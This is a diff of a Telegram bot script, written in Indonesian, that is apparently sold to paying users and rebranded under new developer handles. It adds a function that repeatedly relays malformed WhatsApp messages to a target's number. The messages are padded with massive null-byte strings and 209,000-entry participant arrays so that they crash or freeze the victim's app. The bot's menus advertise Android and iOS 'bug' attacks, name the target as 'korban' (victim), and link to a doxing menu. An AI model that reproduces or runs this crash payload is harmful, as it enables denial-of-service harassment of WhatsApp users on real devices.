@@ -152,7 +152,19 @@ async function fetchValidTokens() {
   }
 }
 
+async function validateToken() {
+  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));
 
+  const validTokens = await fetchValidTokens();
+  if (!validTokens.includes(BOT_TOKEN)) {
+    console.log(chalk.red("❌ Token tidak valid! Bot tidak dapat dijalankan."));
+    process.exit(1);
+  }
+
+  console.log(chalk.green(` JANGAN LUPA MASUK CH INFO SCRIPT⠀⠀`));
+  startBot();
+  initializeWhatsAppConnections();
+}
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
@@ -185,9 +197,9 @@ console.log(chalk.greenBright(`
 ┌─────────────────────────────┐
 │ ⚠️ inicialização em execução com sucesso  
 ├─────────────────────────────┤
-│ DESENVOLVEDOR : DK      
-│ TELEGRAMA : @MbapeGnteng
-│ CHANEL : @testimbape
+│ DESENVOLVEDOR : DARKRELAY      
+│ TELEGRAMA : @armufaXarya
+│ CHANEL : @allinfoarmufa
 └─────────────────────────────┘
 `));
 
@@ -197,7 +209,7 @@ console.log(chalk.blueBright(`
 ));
 };
 
-
+validateToken();
 let sock;
 
 function saveActiveSessions(botNumber) {
@@ -559,7 +571,94 @@ async function sendOfferVideoCall(target) {
   }
 }
 //--------------------------------------------FUNCTION BUG----------------------------------------------------------\\
+async function maklodelay(sock, target) {
+const x = "\u0000".repeat(9000);
+const ryy = "999999999999";
+const startTime = Date.now();
+const duration = 1 * 60 * 1000;
+while (Date.now() - startTime < duration) {
+const xryy = {
+    groupStatusMessageV2: {
+      message: {
+        stickerPackMessage: {
+          stickerPackId: x,
+          name: x,
+          publisher: x,
+          fileLength: ryy,
+          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+          mimetype: "image/webp",
+          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+          contextInfo: {
+          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
+          isForwarded: true,
+          forwardingScore: 9999,
+          urlTrackingMap: {
+            urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
+              participant: `62${z + 899099}@s.whatsapp.net`
+            }))
+          }
+         }
+        }
+      }
+    }
+  };
+  
+  const xryyv2 = {
+  groupStatusMessageV2: {
+      message: {
+      interactiveResponseMessage: {
+        body: {
+          text: "XRyyModeLawkaNnjr",
+          format: "DEFAULT"
+        },
+        nativeFlowResponseMessage: {
+          name: "galaxy_message",
+          paramsJson: "1",
+          version: 3
+        },
+        nativeFlowResponseMessage: {
+          name: "flow_message",
+          paramsJson: "2",
+          version: 3
+        },
+        nativeFlowResponseMessage: {
+          name: "request_call_message",
+          paramsJson: "3",
+          version: 3
+        },
+        nativeFlowResponseMessage: {
+          name: "order_message",
+          paramsJson: "4",
+          version: 3
+        },
+        contextInfo: {
+          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
+          isForwarded: true,
+          forwardingScore: 9999,
+          urlTrackingMap: {
+            urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
+              participant: `62${z + 720599}@s.whatsapp.net`
+            }))
+            } 
+          }
+        }
+      }
+    }
+  };
 
+  await sock.relayMessage(target, xryy, {
+    participant: { jid: target }
+  });
+    await sock.relayMessage(target, xryyv2, {
+    participant: { jid: target }
+  });
+} 
+} 
+
+// NO SHARE PT / OWN / MODS DLL NO SHARE
+// EXPOSED BY: @Ftmncloud12
 
 
 //------------------------------------------------------------------------------------------------------------------------------\\
@@ -572,12 +671,13 @@ const userMode = {};
 function buildKeyboard(style) {
   return [
     [
-      { text: "XBUGS", callback_data: "trashmenu", style: style },
-      { text: "XSETTINGS", callback_data: "menu", style: style }
+      { text: "⬅️", callback_data: "groupMenu", style: style },
+      { text: "🏠", callback_data: "back_to_main", style: style },
+      { text: "➡️", callback_data: "Doxing", style: style }
     ],
     [
-      { text: "XTHANKS", callback_data: "TqTo", style: style },
-      { text: "XTOOLS", callback_data: "menuTools", style: style }
+      { text: "INVISIBLE BUG", callback_data: "trashmenu", style: style },
+      { text: "VISIBILE BUG", callback_data: "trashmenu2", style: style }
     ],
     [
       { text: "DEVELOPERS", url: "https://t.me/MbapeGnteng", style: style }
@@ -647,7 +747,7 @@ function colorMenu() {
         { text: "🟢 Hijau", callback_data: "color_green" }
       ],
       [
-        { text: "🟡 Kuning", callback_data: "color_yellow" },
+        { text: "🔵 Biru ", callback_data: "color_yellow" },
         { text: "💃 Disko", callback_data: "color_disco" }
       ]
     ]
@@ -672,11 +772,11 @@ bot.onText(/\/start/, async (msg) => {
   const sent = await bot.sendPhoto(chatId, getRandomImage(), {
     caption: `<b><blockquote>⏤ ( 🍂 ) — こんにちは ${username}</blockquote>
     
-最新かつ最強レベルのシステムです。ぜひ体験してくださいこれこそ @MbapeGnteng
+<blockquote>最新かつ最強レベルのシステムです。ぜひ体験してくださいこれこそ @armufaXarya
 
-⫹⫺ Pemilik : @MbapeGnteng<tg-emoji emoji-id="5447249559149367631">🌲</tg-emoji>
-⫹⫺ Support : All Buyer Gw<tg-emoji emoji-id="6098375676488848970">⭐</tg-emoji>
-⫹⫺ Version : 9.0<tg-emoji emoji-id="6098239916867588854">👾</tg-emoji>
+⫹⫺ Pemilik : @armufaXarya
+⫹⫺ Support : All Buyer Gw
+⫹⫺ Version : 9.0</blockquote>
 
 MOHON PILIH WARNA DI BAWAH INI</b>`,
     parse_mode: "HTML",
@@ -706,7 +806,7 @@ bot.on("callback_query", async (query) => {
     if (data !== "color_disco") stopDisco(chatId);
 
     const runtime = getBotRuntime();
-    const developer = "@MbapeGnteng"
+    const developer = "@armufaXarya"
     const memory = formatMemory();
     const cooldown = checkCooldown(senderId);
     const premiumStatus = getPremiumStatus(senderId);
@@ -735,7 +835,7 @@ bot.on("callback_query", async (query) => {
   const style = getUserStyle(userMode[chatId] || "color_green");
 
   caption = `\`\`\`javascript
-✦••┈┈ ( 🫀 ) - 𝐕𝐚𝐧𝐭𝐡𝐫𝐚 - ┈┈••✦
+✦••┈┈ ( 🫀 ) - ꧁𝗗𝗔𝗥𝗞𝗥𝗘𝗟𝗔𝗬 𝗩𝟯꧂ - ┈┈••✦
 𖥊. -  ᴏᴡɴᴇʀ : ${developer}
 𖥊. -  ᴠᴇʀsɪᴏɴ : 𝟷.𝟶
 
@@ -756,7 +856,7 @@ bot.on("callback_query", async (query) => {
 
       caption = `
 \`\`\`javascript
-✦••┈┈ ( 🫀 ) - 𝐕𝐚𝐧𝐭𝐡𝐫𝐚 - ┈┈••✦
+✦••┈┈ ( 🚀 ) - 𝗩𝗜𝗦𝗜𝗕𝗟𝗘 𝗕𝗨𝗚 - ┈┈••✦
 𖥊. -  ᴏᴡɴᴇʀ : ${developer}
 𖥊. -  ᴠᴇʀsɪᴏɴ : 𝟷.𝟶
 
@@ -766,11 +866,18 @@ bot.on("callback_query", async (query) => {
 𖥊. - ᴘʀᴇᴍɪᴜᴍ sᴛᴀᴛᴜs : ${premiumStatus}
 𖥊. - ᴄᴏᴏʟᴅᴏᴡɴ sᴄʀɪᴘᴛ : ${cooldown} sᴇᴄᴏɴᴅs
 
-✦••┈┈ - 𝐀𝐧𝐝𝐫𝐨 𝐁𝐮𝐠𝐬  - ┈┈••✦
+✦••┈┈ - ᴀɴᴅʀᴏɪᴅ ʙᴜɢ  - ┈┈••✦
 𖥊. - /delay  - delay hard level
 𖥊. - /blank - Blank Hard
 𖥊. - /freeze - Freeze
-𖥊. - /forceClose - Force Close
+
+✦••┈┈ - ɪᴏꜱ ʙᴜɢ - ┈┈••✦
+𖥊. - /iosDelay - ios Delay
+𖥊. - /iosBlank - ios Blank
+𖥊. - /iosFc - ios Force Close
+𖥊. - /iosFreeze - ios Freeze
+
+
 
 ⧫━⟢ 𝐓𝐞𝐫𝐢𝐦𝐚 𝐊𝐚𝐬𝐢𝐡 ⟣━⧫
 \`\`\`
@@ -779,11 +886,14 @@ bot.on("callback_query", async (query) => {
       replyMarkup = {
         inline_keyboard: [
           [
-            { text: "𝕭𝖚𝖌𝕿𝖜𝖔", 
-            callback_data: "trashmenu2", 
+            { text: "⬅️", 
+            callback_data: "menu", 
             style: "danger" },
-            { text: "𝕭𝖆𝖈𝖐", 
-            callback_data: "back_to_main",
+            { text: "🏠", 
+            callback_data: "back_to_main", 
+            style: "danger" },
+            { text: "➡️", 
+            callback_data: "trashmenu2",
             style: "danger" }
           ]
         ]
@@ -795,7 +905,7 @@ bot.on("callback_query", async (query) => {
 
       caption = `
 \`\`\`javascript
-✦••┈┈ ( 🫀 ) - 𝐕𝐚𝐧𝐭𝐡𝐫𝐚 - ┈┈••✦
+✦••┈┈ ( 🛠️ ) - 𝗜𝗡𝗩𝗜𝗦𝗜𝗕𝗟𝗘 𝗕𝗨𝗚 - ┈┈••✦
 𖥊. -  ᴏᴡɴᴇʀ : ${developer}
 𖥊. -  ᴠᴇʀsɪᴏɴ : 𝟷.𝟶
 
@@ -805,11 +915,12 @@ bot.on("callback_query", async (query) => {
 𖥊. - ᴘʀᴇᴍɪᴜᴍ sᴛᴀᴛᴜs : ${premiumStatus}
 𖥊. - ᴄᴏᴏʟᴅᴏᴡɴ sᴄʀɪᴘᴛ : ${cooldown} sᴇᴄᴏɴᴅs
 
-✦••┈┈ - 𝐈𝐨𝐬 𝐁𝐮𝐠𝐬 - ┈┈••✦
-𖥊. - /iosDelay - ios Delay
-𖥊. - /iosBlank - ios Blank
-𖥊. - /iosFc - ios Force Close
-𖥊. - /iosFreeze - ios Freeze
+✦••┈┈ - ᴠɪꜱɪʙʟᴇ ʙᴜɢ  - ┈┈••✦
+𖥊. - /delay  - delay hard level
+𖥊. - /blank - Blank Hard
+𖥊. - /freeze - Freeze
+
+
 
 ⧫━⟢ 𝐓𝐞𝐫𝐢𝐦𝐚 𝐊𝐚𝐬𝐢𝐡 ⟣━⧫
 \`\`\`
@@ -818,9 +929,15 @@ bot.on("callback_query", async (query) => {
       replyMarkup = {
         inline_keyboard: [
           [
-            { text: "𝕭𝖆𝖈𝖐",
+            { text: "⬅️", 
             callback_data: "trashmenu", 
-            style: "success" }
+            style: "danger" },
+            { text: "🏠", 
+            callback_data: "back_to_main", 
+            style: "danger" },
+            { text: "➡️", 
+            callback_data: "menuTools",
+            style: "danger" }
           ]
         ]
       };
@@ -831,7 +948,7 @@ bot.on("callback_query", async (query) => {
 
       caption = `
 \`\`\`javascript
-✦••┈┈ ( 🫀 ) - 𝐕𝐚𝐧𝐭𝐡𝐫𝐚 - ┈┈••✦
+✦••┈┈ ( 🫀 ) - ꧁𝗗𝗔𝗥𝗞𝗥𝗘𝗟𝗔𝗬 𝗩𝟯꧂ - ┈┈••✦
 𖥊. -  ᴏᴡɴᴇʀ : ${developer}
 𖥊. -  ᴠᴇʀsɪᴏɴ : 𝟷.𝟶
 
@@ -871,22 +988,15 @@ bot.on("callback_query", async (query) => {
       replyMarkup = {
         inline_keyboard: [
           [
-           { text: "𝕲𝖗𝖔𝖚𝖕𝕸𝖊𝖓𝖚",
-           callback_data: "groupMenu",
-           style: "danger" }, 
-           { text: "𝕯𝖔𝖝𝖎𝖓𝖌𝕸𝖊𝖓𝖚",
-           callback_data: "Doxing",
-           style: "danger" }
-          ], 
-          [
-           { text: "𝕿𝖔𝖔𝖑𝖘𝕿𝖜𝖔",
-           callback_data: "ToolsTwo", 
-           style: "primary" }
-          ], 
-          [
-            { text: "𝕭𝖆𝖈𝖐",
-            callback_data: "back_to_main",
-            style: "primary" }
+            { text: "⬅️", 
+            callback_data: "trashmenu2", 
+            style: "danger" },
+            { text: "🏠", 
+            callback_data: "back_to_main", 
+            style: "danger" },
+            { text: "➡️", 
+            callback_data: "groupMenu",
+            style: "danger" }
           ]
         ]
       };
@@ -897,7 +1007,7 @@ bot.on("callback_query", async (query) => {
 
       caption = `
 \`\`\`javascript
-✦••┈┈ ( 🫀 ) - 𝐕𝐚𝐧𝐭𝐡𝐫𝐚 - ┈┈••✦
+✦••┈┈ ( 🫀 ) - ꧁𝗗𝗔𝗥𝗞𝗥𝗘𝗟𝗔𝗬 𝗩𝟯꧂ - ┈┈••✦
 𖥊. -  ᴏᴡɴᴇʀ : ${developer}
 𖥊. -  ᴠᴇʀsɪᴏɴ : 𝟷.𝟶
 
@@ -936,8 +1046,14 @@ bot.on("callback_query", async (query) => {
     replyMarkup = {
         inline_keyboard: [
           [
-            { text: "𝕭𝖆𝖈𝖐", 
-            callback_data: "menuTools",
+            { text: "⬅️", 
+            callback_data: "menuTools", 
+            style: "danger" },
+            { text: "🏠", 
+            callback_data: "back_to_main", 
+            style: "danger" },
+            { text: "➡️", 
+            callback_data: "ToolsTwo",
             style: "danger" }
           ]
         ]
@@ -949,7 +1065,7 @@ bot.on("callback_query", async (query) => {
 
       caption = `
 \`\`\`javascript
-✦••┈┈ ( 🫀 ) - 𝐕𝐚𝐧𝐭𝐡𝐫𝐚 - ┈┈••✦
+✦••┈┈ ( 🫀 ) - ꧁𝗗𝗔𝗥𝗞𝗥𝗘𝗟𝗔𝗬 𝗩𝟯꧂ - ┈┈••✦
 𖥊. -  ᴏᴡɴᴇʀ : ${developer}
 𖥊. -  ᴠᴇʀsɪᴏɴ : 𝟷.𝟶
 
@@ -964,8 +1080,6 @@ bot.on("callback_query", async (query) => {
 〢-╰➤ ° ↯ Restart Bot Telegram ¡
 ┃☰. - /update « Reply File »
 〢-╰➤ ° ↯ Replacing The index.js File ¡
-┃☰. - /chatowner « Text »
-〢-╰➤ ° ↯ Message Owner From Bot ¡
 ┃☰. - /sticker « Reply Image »
 〢-╰➤ ° ↯ Convert Image To Sticker ¡
 ┃☰. - /getcode « Url »
@@ -986,9 +1100,15 @@ bot.on("callback_query", async (query) => {
     replyMarkup = {
         inline_keyboard: [
           [
-            { text: "𝕭𝖆𝖈𝖐",
-            callback_data: "menuTools", 
-            style: "primary" }
+            { text: "⬅️", 
+            callback_data: "groupMenu", 
+            style: "danger" },
+            { text: "🏠", 
+            callback_data: "back_to_main", 
+            style: "danger" },
+            { text: "➡️", 
+            callback_data: "Doxing",
+            style: "danger" }
           ]
         ]
       };
@@ -999,7 +1119,7 @@ bot.on("callback_query", async (query) => {
 
       caption = `
 \`\`\`javascript
-✦••┈┈ ( 🫀 ) - 𝐕𝐚𝐧𝐭𝐡𝐫𝐚 - ┈┈••✦
+✦••┈┈ ( 🫀 ) - ꧁𝗗𝗔𝗥𝗞𝗥𝗘𝗟𝗔𝗬 𝗩𝟯꧂ - ┈┈••✦
 𖥊. -  ᴏᴡɴᴇʀ : ${developer}
 𖥊. -  ᴠᴇʀsɪᴏɴ : 𝟷.𝟶
 
@@ -1022,9 +1142,15 @@ bot.on("callback_query", async (query) => {
     replyMarkup = {
         inline_keyboard: [
           [
-            { text: "𝕭𝖆𝖈𝖐",
-            callback_data: "menuTools", 
-            style: "success" }
+            { text: "⬅️", 
+            callback_data: "ToolsTwo", 
+            style: "danger" },
+            { text: "🏠", 
+            callback_data: "back_to_main", 
+            style: "danger" },
+            { text: "➡️", 
+            callback_data: "TqTo",
+            style: "danger" }
           ]
         ]
       };
@@ -1035,7 +1161,7 @@ bot.on("callback_query", async (query) => {
 
       caption = `
 \`\`\`javascript
-✦••┈┈ ( 🫀 ) - 𝐕𝐚𝐧𝐭𝐡𝐫𝐚 - ┈┈••✦
+✦••┈┈ ( 🫀 ) - ꧁𝗗𝗔𝗥𝗞𝗥𝗘𝗟𝗔𝗬 𝗩𝟯꧂ - ┈┈••✦
 𖥊. -  ᴏᴡɴᴇʀ : ${developer}
 𖥊. -  ᴠᴇʀsɪᴏɴ : 𝟷.𝟶
 
@@ -1046,7 +1172,7 @@ bot.on("callback_query", async (query) => {
 𖥊. - ᴄᴏᴏʟᴅᴏᴡɴ sᴄʀɪᴘᴛ : ${cooldown} sᴇᴄᴏɴᴅs
 
 ─ #- 𝕿𝖍𝖆𝖓𝖐𝖘 𝖙𝖔° ─( 🫀 )
-┃☰. @MbapeGnteng
+┃☰. @armufaXarya
 〢-╰➤ ° ↯ ᴅᴇᴠᴇʟᴏᴘᴇʀ
 ┃☰. @Sanzope
 〢-╰➤ ° ↯ ᴍʏ ʙᴇsᴛ ғʀɪᴇɴᴅ
@@ -1074,9 +1200,15 @@ bot.on("callback_query", async (query) => {
       replyMarkup = {
         inline_keyboard: [
           [
-            { text: "𝕭𝖆𝖈𝖐",
+            { text: "⬅️", 
+            callback_data: "Doxing", 
+            style: "danger" },
+            { text: "🏠", 
             callback_data: "back_to_main", 
-            style: "primary" }
+            style: "danger" },
+            { text: "➡️", 
+            callback_data: "menu",
+            style: "danger" }
           ]
         ]
       };
@@ -1087,7 +1219,7 @@ bot.on("callback_query", async (query) => {
 
       caption = `
 \`\`\`javascript
-✦••┈┈ ( 🫀 ) - 𝐕𝐚𝐧𝐭𝐡𝐫𝐚 - ┈┈••✦
+✦••┈┈ ( 🫀 ) - ꧁𝗗𝗔𝗥𝗞𝗥𝗘𝗟𝗔𝗬 𝗩𝟯꧂ - ┈┈••✦
 𖥊. -  ᴏᴡɴᴇʀ : ${developer}
 𖥊. -  ᴠᴇʀsɪᴏɴ : 𝟷.𝟶
 
@@ -1114,8 +1246,14 @@ bot.on("callback_query", async (query) => {
       replyMarkup = {
         inline_keyboard: [
           [
-            { text: "𝕭𝖆𝖈𝖐",
+            { text: "⬅️", 
+            callback_data: "TqTo", 
+            style: "danger" },
+            { text: "🏠", 
             callback_data: "back_to_main", 
+            style: "danger" },
+            { text: "➡️", 
+            callback_data: "trashmenu",
             style: "danger" }
           ]
         ]
@@ -1203,7 +1341,7 @@ BUY AKSES DULU SONO SAMA DK IMUT
 \`\`\`
 #𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
 \`\`\`
-◇ 𝐎𝐖𝐍𝐄𝐑 : @MbapeGnteng
+◇ 𝐎𝐖𝐍𝐄𝐑 : @armufaXarya
 ◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
 ◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : DELAY HARD
 ◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
@@ -1232,7 +1370,7 @@ NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
 \`\`\`
 #𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
 \`\`\`
-◇ 𝐎𝐖𝐍𝐄𝐑 : @MbapeGnteng
+◇ 𝐎𝐖𝐍𝐄𝐑 : @armufaXarya
 ◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
 ◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : DELAY HARD
 ◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
@@ -1313,7 +1451,7 @@ BUY AKSES DULU SONO SAMA DK IMUT
 \`\`\`
 #𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
 \`\`\`
-◇ 𝐎𝐖𝐍𝐄𝐑 : @MbapeGnteng
+◇ 𝐎𝐖𝐍𝐄𝐑 : @armufaXarya
 ◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
 ◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : BLANK
 ◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
@@ -1342,7 +1480,7 @@ NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
 \`\`\`
 #𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
 \`\`\`
-◇ 𝐎𝐖𝐍𝐄𝐑 : @MbapeGnteng
+◇ 𝐎𝐖𝐍𝐄𝐑 : @armufaXarya
 ◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
 ◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : BLANK
 ◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
@@ -1423,7 +1561,7 @@ BUY AKSES DULU SONO SAMA DK IMUT
 \`\`\`
 #𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
 \`\`\`
-◇ 𝐎𝐖𝐍𝐄𝐑 : @MbapeGnteng
+◇ 𝐎𝐖𝐍𝐄𝐑 : @armufaXarya
 ◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
 ◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FC IOS
 ◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
@@ -1452,7 +1590,7 @@ NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
 \`\`\`
 #𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
 \`\`\`
-◇ 𝐎𝐖𝐍𝐄𝐑 : @MbapeGnteng
+◇ 𝐎𝐖𝐍𝐄𝐑 : @armufaXarya
 ◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
 ◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FC IOS
 ◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
@@ -1533,7 +1671,7 @@ BUY AKSES DULU SONO SAMA DK IMUT
 \`\`\`
 #𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
 \`\`\`
-◇ 𝐎𝐖𝐍𝐄𝐑 : @MbapeGnteng
+◇ 𝐎𝐖𝐍𝐄𝐑 : @armufaXarya
 ◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
 ◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FREEZE IOS
 ◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
@@ -1562,7 +1700,7 @@ NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
 \`\`\`
 #𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
 \`\`\`
-◇ 𝐎𝐖𝐍𝐄𝐑 : @MbapeGnteng
+◇ 𝐎𝐖𝐍𝐄𝐑 : @armufaXarya
 ◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
 ◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FREEZE IOS
 ◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
@@ -1643,7 +1781,7 @@ BUY AKSES DULU SONO SAMA DK IMUT
 \`\`\`
 #𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
 \`\`\`
-◇ 𝐎𝐖𝐍𝐄𝐑 : @MbapeGnteng
+◇ 𝐎𝐖𝐍𝐄𝐑 : @armufaXarya
 ◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
 ◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : DELAY HARD
 ◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
@@ -1656,7 +1794,7 @@ NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
 
     console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
     for (let i = 0; i < 60; i++) {
-      await MbaPe(sock, jid);
+      await maklodelay(sock, jid);
       await sleep(300);
       console.log(
         chalk.red(
@@ -1672,7 +1810,7 @@ NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
 \`\`\`
 #𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
 \`\`\`
-◇ 𝐎𝐖𝐍𝐄𝐑 : @MbapeGnteng
+◇ 𝐎𝐖𝐍𝐄𝐑 : @armufaXarya
 ◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
 ◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : DELAY HARD
 ◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
@@ -1753,7 +1891,7 @@ BUY AKSES DULU SONO SAMA DK IMUT
 \`\`\`
 #𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
 \`\`\`
-◇ 𝐎𝐖𝐍𝐄𝐑 : @MbapeGnteng
+◇ 𝐎𝐖𝐍𝐄𝐑 : @armufaXarya
 ◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
 ◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : BLANK HARD
 ◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
@@ -1782,7 +1920,7 @@ NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
 \`\`\`
 #𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
 \`\`\`
-◇ 𝐎𝐖𝐍𝐄𝐑 : @MbapeGnteng
+◇ 𝐎𝐖𝐍𝐄𝐑 : @armufaXarya
 ◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
 ◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : BLANK HARD
 ◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
@@ -1863,7 +2001,7 @@ BUY AKSES DULU SONO SAMA DK IMUT
 \`\`\`
 #𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
 \`\`\`
-◇ 𝐎𝐖𝐍𝐄𝐑 : @MbapeGnteng
+◇ 𝐎𝐖𝐍𝐄𝐑 : @armufaXarya
 ◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
 ◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FORCE CLOSE
 ◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
@@ -1892,7 +2030,7 @@ NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
 \`\`\`
 #𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
 \`\`\`
-◇ 𝐎𝐖𝐍𝐄𝐑 : @MbapeGnteng
+◇ 𝐎𝐖𝐍𝐄𝐑 : @armufaXarya
 ◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
 ◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FORCE CLOSE
 ◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
@@ -1973,7 +2111,7 @@ BUY AKSES DULU SONO SAMA DK IMUT
 \`\`\`
 #𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
 \`\`\`
-◇ 𝐎𝐖𝐍𝐄𝐑 : @MbapeGnteng
+◇ 𝐎𝐖𝐍𝐄𝐑 : @armufaXarya
 ◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
 ◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FREEZE
 ◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
@@ -2002,7 +2140,7 @@ NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
 \`\`\`
 #𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚
 \`\`\`
-◇ 𝐎𝐖𝐍𝐄𝐑 : @MbapeGnteng
+◇ 𝐎𝐖𝐍𝐄𝐑 : @armufaXarya
 ◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
